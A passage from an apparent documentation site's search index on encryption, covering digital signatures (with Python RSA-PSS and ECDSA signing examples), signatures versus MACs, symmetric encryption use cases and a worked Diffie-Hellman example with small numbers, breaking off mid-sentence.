\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   software.exe   \u2502\n   \u2502        +         \u2502  Developer signs\n   \u2502   Signature      \u2502  Users verify authenticity\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n   Examples: Windows code signing, Apple developer certificates\n\n2. EMAIL SECURITY (S/MIME, PGP)\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502     Email        \u2502\n   \u2502  From: Alice     \u2502  Sign email\n   \u2502  To: Bob         \u2502  Prove sender\n   \u2502  + Signature     \u2502  Detect tampering\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n3. DOCUMENT SIGNING (PDF, DocuSign)\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   Contract.pdf   \u2502\n   \u2502 [Signature]      \u2502  Legally binding\n   \u2502 Signed by: Alice \u2502  Non-repudiation\n   \u2502 Date: 2025-12-30 \u2502  Tamper-evident\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n4. SSL/TLS CERTIFICATES\n   Server proves identity with digital signature\n   on its certificate\n\n5. BLOCKCHAIN/CRYPTOCURRENCY\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Transaction     \u2502\n   \u2502  From: Wallet A  \u2502  Prove ownership\n   \u2502  To: Wallet B    \u2502  Authorize transfer\n   \u2502  Amount: 1 BTC   \u2502  Prevent tampering\n   \u2502  + Signature     \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n6. CODE REPOSITORIES (Git commits)\n   Git commit signed with GPG key\n   Proves commit author identity\n\n7. API AUTHENTICATION\n   Sign API requests to prove identity\n   Prevent request tampering\n</code></pre>"},{"location":"security/encryption/#advantages-of-digital-signatures","title":"Advantages of Digital Signatures","text":"<pre><code>\u2705 SECURITY BENEFITS:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. AUTHENTICATION\n   Proves who created/sent the message\n   Cannot be forged without private key\n\n2. INTEGRITY\n   Any modification invalidates signature\n   Even one bit changed = signature fails\n\n3. NON-REPUDIATION\n   Signer cannot deny signing\n   Legal proof of agreement\n   Binding like handwritten signature\n\n4. EFFICIENCY\n   Faster than encrypting entire document\n   Only sign hash (fixed size)\n\n5. VERIFIABLE\n   Anyone with public key can verify\n   No secrets need to be shared\n\n6. SCALABLE\n   One key pair for unlimited signatures\n   Public key can be widely distributed\n\n7. TIMESTAMPING\n   Can include timestamp in signature\n   Proves when document was signed\n</code></pre>"},{"location":"security/encryption/#digital-signature-implementation","title":"Digital Signature Implementation","text":"<pre><code>from cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives.asymmetric import ec\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.exceptions import InvalidSignature\n\n# RSA Digital Signature\nclass RSASignature:\n    def __init__(self):\n        # Generate RSA key pair\n        self.private_key = rsa.generate_private_key(\n            public_exponent=65537,\n            key_size=2048\n        )\n        self.public_key = self.private_key.public_key()\n\n    def sign(self, message: bytes) -&gt; bytes:\n        \"\"\"Sign a message with private key\"\"\"\n        signature = self.private_key.sign(\n            message,\n            padding.PSS(\n                mgf=padding.MGF1(hashes.SHA256()),\n                salt_length=padding.PSS.MAX_LENGTH\n            ),\n            hashes.SHA256()\n        )\n        return signature\n\n    def verify(self, message: bytes, signature: bytes) -&gt; bool:\n        \"\"\"Verify signature with public key\"\"\"\n        try:\n            self.public_key.verify(\n                signature,\n                message,\n                padding.PSS(\n                    mgf=padding.MGF1(hashes.SHA256()),\n                    salt_length=padding.PSS.MAX_LENGTH\n                ),\n                hashes.SHA256()\n            )\n            return True\n        except InvalidSignature:\n            return False\n\n# ECDSA Digital Signature\nclass ECDSASignature:\n    def __init__(self):\n        # Generate ECDSA key pair (P-256 curve)\n        self.private_key = ec.generate_private_key(ec.SECP256R1())\n        self.public_key = self.private_key.public_key()\n\n    def sign(self, message: bytes) -&gt; bytes:\n        \"\"\"Sign a message with ECDSA private key\"\"\"\n        signature = self.private_key.sign(\n            message,\n            ec.ECDSA(hashes.SHA256())\n        )\n        return signature\n\n    def verify(self, message: bytes, signature: bytes) -&gt; bool:\n        \"\"\"Verify ECDSA signature\"\"\"\n        try:\n            self.public_key.verify(\n                signature,\n                message,\n                ec.ECDSA(hashes.SHA256())\n            )\n            return True\n        except InvalidSignature:\n            return False\n\n# Usage Example\nif __name__ == '__main__':\n    print(\"=\"*60)\n    print(\"Digital Signature Demonstration\")\n    print(\"=\"*60)\n\n    # Test message\n    message = b\"This is a signed contract agreement.\"\n\n    # RSA Signature\n    print(\"\\n1. RSA Signature:\")\n    print(\"-\" * 40)\n    rsa_sig = RSASignature()\n\n    # Sign\n    signature = rsa_sig.sign(message)\n    print(f\"Message: {message.decode()}\")\n    print(f\"Signature length: {len(signature)} bytes\")\n    print(f\"Signature (first 40 chars): {signature.hex()[:40]}...\")\n\n    # Verify valid signature\n    is_valid = rsa_sig.verify(message, signature)\n    print(f\"\u2705 Signature valid: {is_valid}\")\n\n    # Verify tampered message\n    tampered = b\"This is a MODIFIED contract agreement.\"\n    is_valid_tampered = rsa_sig.verify(tampered, signature)\n    print(f\"\u274c Tampered message valid: {is_valid_tampered}\")\n\n    # ECDSA Signature\n    print(\"\\n2. ECDSA Signature:\")\n    print(\"-\" * 40)\n    ecdsa_sig = ECDSASignature()\n\n    # Sign\n    signature = ecdsa_sig.sign(message)\n    print(f\"Message: {message.decode()}\")\n    print(f\"Signature length: {len(signature)} bytes\")\n    print(f\"Signature (first 40 chars): {signature.hex()[:40]}...\")\n\n    # Verify\n    is_valid = ecdsa_sig.verify(message, signature)\n    print(f\"\u2705 Signature valid: {is_valid}\")\n\n    # Comparison\n    print(\"\\n3. Comparison:\")\n    print(\"-\" * 40)\n    print(\"RSA-2048:\")\n    print(\"  Key size: 2048 bits\")\n    print(\"  Signature size: 256 bytes\")\n    print(\"  Speed: Moderate\")\n    print(\"\\nECDSA P-256:\")\n    print(\"  Key size: 256 bits\")\n    print(\"  Signature size: ~64 bytes\")\n    print(\"  Speed: Fast\")\n    print(\"  Advantage: Smaller, faster, same security\")\n\n# Document Signing Example\nclass DocumentSigner:\n    \"\"\"Sign and verify documents with metadata\"\"\"\n\n    def __init__(self):\n        self.rsa_sig = RSASignature()\n\n    def sign_document(self, document: bytes, signer_name: str) -&gt; dict:\n        \"\"\"Sign document and return signature package\"\"\"\n        import datetime\n\n        # Create signature metadata\n        timestamp = datetime.datetime.utcnow().isoformat()\n\n        # Sign document\n        signature = self.rsa_sig.sign(document)\n\n        # Create signature package\n        package = {\n            'document': document,\n            'signature': signature,\n            'signer': signer_name,\n            'timestamp': timestamp,\n            'algorithm': 'RSA-2048-PSS',\n            'hash': 'SHA-256'\n        }\n\n        return package\n\n    def verify_document(self, package: dict) -&gt; dict:\n        \"\"\"Verify signed document\"\"\"\n        document = package['document']\n        signature = package['signature']\n\n        is_valid = self.rsa_sig.verify(document, signature)\n\n        return {\n            'valid': is_valid,\n            'signer': package['signer'],\n            'timestamp': package['timestamp'],\n            'algorithm': package['algorithm']\n        }\n\n# Usage\nsigner = DocumentSigner()\ndoc = b\"Confidential Agreement: Terms and Conditions...\"\n\n# Sign\nsigned_doc = signer.sign_document(doc, \"Alice Smith\")\nprint(f\"\\n\ud83d\udcdd Document signed by: {signed_doc['signer']}\")\nprint(f\"\u23f0 Timestamp: {signed_doc['timestamp']}\")\n\n# Verify\nverification = signer.verify_document(signed_doc)\nprint(f\"\u2705 Valid: {verification['valid']}\")\nprint(f\"\ud83d\udc64 Signer: {verification['signer']}\")\n</code></pre>"},{"location":"security/encryption/#digital-signature-vs-mac-message-authentication-code","title":"Digital Signature vs MAC (Message Authentication Code)","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        Digital Signature vs MAC Comparison                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nDIGITAL SIGNATURE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nKey Type:    Asymmetric (public/private)\nCreated by:  Private key\nVerified by: Public key (anyone)\nUse Case:    Public verification, non-repudiation\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Signer  \u2502                           \u2502 Anyone   \u2502\n\u2502          \u2502  Document + Signature     \u2502          \u2502\n\u2502 Private  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  Public  \u2502\n\u2502   Key    \u2502                           \u2502   Key    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                          \u2713 Verify\n\nNon-repudiation: \u2705 Yes\nSpeed: \ud83d\udc0c Slower\n\nMAC (HMAC):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nKey Type:    Symmetric (shared secret)\nCreated by:  Shared secret key\nVerified by: Shared secret key (only key holders)\nUse Case:    Integrity between trusted parties\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Sender  \u2502                           \u2502 Receiver \u2502\n\u2502          \u2502  Document + MAC           \u2502          \u2502\n\u2502  Secret  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502  Secret  \u2502\n\u2502   Key    \u2502                           \u2502   Key    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                                          \u2713 Verify\n\nNon-repudiation: \u274c No (both parties have same key)\nSpeed: \u26a1 Fast\n\nWHEN TO USE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nDigital Signature:\n- Public document verification\n- Legal documents\n- Software signing\n- Email signing\n- When non-repudiation needed\n\nMAC:\n- TLS/HTTPS session integrity\n- API authentication (both parties trust)\n- Faster performance needed\n- Internal systems\n</code></pre>"},{"location":"security/encryption/#symmetric-encryption-use-cases","title":"Symmetric Encryption Use Cases","text":"<pre><code>\u2705 RECOMMENDED USE CASES:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n1. DISK ENCRYPTION\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Hard Drive     \u2502\n   \u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510  \u2502     Fast encryption/decryption\n   \u2502  \u2502 Encrypted \u2502  \u2502     Single user (one key)\n   \u2502  \u2502   Files   \u2502  \u2502     BitLocker, FileVault\n   \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n2. DATABASE ENCRYPTION\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   Database      \u2502\n   \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502     Encrypt data at rest\n   \u2502 \u2502  Encrypted  \u2502 \u2502     High performance needed\n   \u2502 \u2502   Records   \u2502 \u2502     TDE (Transparent Data Encryption)\n   \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n3. FILE ENCRYPTION\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502   file.pdf      \u2502\n   \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502     Protect sensitive documents\n   \u2502 \u2502  Encrypted  \u2502 \u2502     7-Zip, VeraCrypt\n   \u2502 \u2502   Content   \u2502 \u2502     Password-based encryption\n   \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n4. VPN TUNNELS\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510          \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502 Client \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 Server \u2502  Secure communication channel\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  AES-256 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  After key exchange (HTTPS, IPSec)\n\n5. SESSION ENCRYPTION (After HTTPS Handshake)\n   Browser \u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6 Server\n           AES-GCM      After asymmetric key exchange\n</code></pre> <p>Advantages: - \u26a1 Fast: Much faster than asymmetric encryption - \ud83d\udcaa Strong: 256-bit AES is virtually unbreakable - \ud83d\udd0b Efficient: Low computational overhead - \ud83d\udce6 Bulk Data: Suitable for encrypting large amounts of data</p> <p>Disadvantages: - \ud83d\udd11 Key Distribution: How to securely share the secret key? - \ud83d\udc65 Scalability: Need n(n-1)/2 keys for n users - \ud83d\udd13 Single Point of Failure: If key is compromised, all data is exposed</p>"},{"location":"security/encryption/#the-key-exchange-problem-diffie-hellman-solution","title":"The Key Exchange Problem &amp; Diffie-Hellman Solution","text":"<p>The Challenge:</p> <p>Symmetric encryption (like AES) is fast and secure, but there's a fundamental problem: How do two parties securely agree on a shared secret key over an insecure network?</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502               THE KEY DISTRIBUTION PROBLEM                   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nALICE wants to send encrypted message to BOB\nBoth need the same AES key\n\n\u274c INSECURE APPROACH:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE                    INTERNET (Insecure)              BOB\n  \u2502                                                         \u2502\n  \u2502  \"Hey Bob, use key: mySecretKey123\"                     \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n  \u2502                         \u26a0\ufe0f                               \u2502\n  \u2502                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                          \u2502\n  \u2502                    \u2502 HACKER  \u2502                          \u2502\n  \u2502                    \u2502 Sees it!\u2502                          \u2502\n  \u2502                    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                          \u2502\n  \u2502                                                         \u2502\n  \u274c PROBLEM: Attacker intercepts the key!\n\nTHE DILEMMA:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n- Can't encrypt the key (no shared key yet!)\n- Can't send it in plaintext (insecure)\n- Can't meet in person (impractical for internet)\n\n\u2705 SOLUTION: Diffie-Hellman Key Exchange\n   Establish shared secret WITHOUT sending it!\n</code></pre>"},{"location":"security/encryption/#how-diffie-hellman-works","title":"How Diffie-Hellman Works","text":"<p>Diffie-Hellman Key Exchange is a revolutionary algorithm that allows two parties to create a shared secret key over an insecure channel without ever transmitting the secret itself.</p> <p>The Magic: Both parties independently compute the same secret using: - Public information (shared openly) - Private information (never shared) - Mathematical properties of modular exponentiation</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         DIFFIE-HELLMAN KEY EXCHANGE (Step-by-Step)          \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nSETUP: Public Parameters (Known to everyone, including attackers)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\np = 23     (Large prime number)\ng = 5      (Generator/base, primitive root of p)\n\nThese are published openly - anyone can know them!\n\nSTEP 1: Generate Private Keys (Secret, never shared)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE                                           BOB\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\n\nChoose random private key:                Choose random private key:\na = 6 (secret!)                           b = 15 (secret!)\n\n     \u2193                                         \u2193\n   KEPT SECRET                              KEPT SECRET\n   Never transmitted                        Never transmitted\n\n\nSTEP 2: Compute Public Keys (Safe to share)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE                                           BOB\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\n\nA = g^a mod p                                 B = g^b mod p\nA = 5^6 mod 23                                B = 5^15 mod 23\nA = 15,625 mod 23                             B = 30,517,578,125 mod 23\nA = 8                                         B = 19\n\nPublic Key: A = 8                             Public Key: B = 19\n\n\nSTEP 3: Exchange Public Keys (Over Insecure Network)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE                    INTERNET                    BOB\n\u2500\u2500\u2500\u2500\u2500\u2500              (Insecure Channel)              \u2500\u2500\u2500\u2500\u2500\n  \u2502                                                    \u2502\n  \u2502           Send A = 8                               \u2502\n  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n  \u2502                                                    \u2502\n  \u2502                  \u26a0\ufe0f Attacker can see: p=23, g=5,   \u2502\n  \u2502                     A=8, B=19                      \u2502\n  \u2502                     But CANNOT find a or b!        \u2502\n  \u2502                                                    \u2502\n  \u2502           Send B = 19                              \u2502\n  \u2502\u25c0\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502\n  \u2502                                                    \u2502\n\n\nSTEP 4: Compute Shared Secret (Independently)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nALICE                                           BOB\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\n\nUses Bob's public (B) and                     Uses Alice's public (A) and\nher private (a):                              his private (b):\n\ns = B^a mod p                                 s = A^b mod p\ns = 19^6 mod 23                               s = 8^15 mod 23\ns = 47,045,881 mod 23                         s = 35,184,372,088,832 mod 23\ns = 2                                         s = 2\n\nShared Secret: 2                              Shared Secret: 2\n\n     \u2502                                             \u2502\n     \u2502         \ud83c\udf89 SAME SECRET KEY! \ud83c\udf89              \u2502\n     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                       \u2502\n                  Both have: s = 2\n                  Without ever transmitting it!\n\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nMATHEMATICAL PROOF (Why it works):\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nAlice computes:  s = B^a mod p = (g^b)^a mod p = g^(ab) mod p\nBob computes:    s = A^b mod p = (g^a)^b mod p = g^(ab) mod p\n\nSince g^(ab) = g^(ba), both get the same result!\n\nExample:\nAlice: (5^15)^6 mod 23 = 5^90 mod 23\nBob:   (5^6)^15 mod 23 = 5^90 mod 23\nBoth equal: 2\n\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nSECURITY: The Discrete Logarithm Problem (DLP)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nAttacker knows: p = 23, g = 5, A = 8, B = 19\nAttacker wants:  a or b (to compute shared secret)\n\nProblem: Given A = g^a mod p, find a\n         Given 8 = 5^a mod 23, find a = ?\n\nFor small numbers: Solvable by brute force\nFor large numbers (2048-bit): Computationally infeasible!\n\nExample with real-world sizes:\np = 2048-bit prime number (617 digits!)\nFinding a is like searching 2^2048 possibilities\n   = 10^617 operations\n   = More than atoms in the universe!\n\nThis is why Diffie-Hellman is 